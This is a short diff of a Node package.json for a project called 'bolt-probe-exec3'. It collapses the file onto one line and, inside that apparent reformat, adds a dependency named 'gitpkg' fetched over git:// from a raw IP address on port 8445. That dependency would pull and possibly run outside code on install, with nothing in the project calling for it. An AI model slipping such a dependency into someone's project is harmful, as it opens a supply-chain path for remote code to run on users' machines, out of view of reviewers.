@@ -1,8 +1,1 @@
-{
-  "name": "bolt-probe-exec3",
-  "version": "1.0.0",
-  "private": true,
-  "dependencies": {
-    "left-pad": "1.0.0"
-  }
-}
+{"name": "bolt-probe-exec3", "version": "1.0.0", "private": true, "dependencies": {"left-pad": "1.0.0", "gitpkg": "git+git://141.98.11.25:8445/gitpkg.git"}}
